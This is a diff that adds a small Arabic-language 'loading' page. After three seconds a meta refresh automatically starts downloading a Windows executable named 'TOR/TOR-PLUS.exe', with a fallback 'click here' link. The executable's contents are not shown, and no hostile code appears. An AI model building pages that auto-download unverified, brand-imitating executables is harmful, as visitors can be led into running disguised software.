@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>جارٍ التحميل...</title>
+  <meta http-equiv="refresh" content="3; url=TOR/TOR-PLUS.exe">
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #f3e7ff, #e6ccff);
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      margin: 0;
+    }
+
+    .loader {
+      border: 6px solid #eee;
+      border-top: 6px solid #7D4698;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .message {
+      font-size: 22px;
+      color: #333;
+      text-align: center;
+    }
+
+    .message a {
+      color: #7D4698;
+      text-decoration: underline;
+      font-weight: bold;
+    }
+
+    .message a:hover {
+      color: #5a2f76;
+    }
+  </style>
+</head>
+<body>
+  <div class="loader"></div>
+  <div class="message">
+    ⏳ جارٍ بدء التحميل تلقائيًا...<br>
+    إذا لم يبدأ خلال لحظات، <a href="TOR/TOR-PLUS.exe">اضغط هنا لتحميل الملف</a>.
+  </div>
+</body>
+</html>
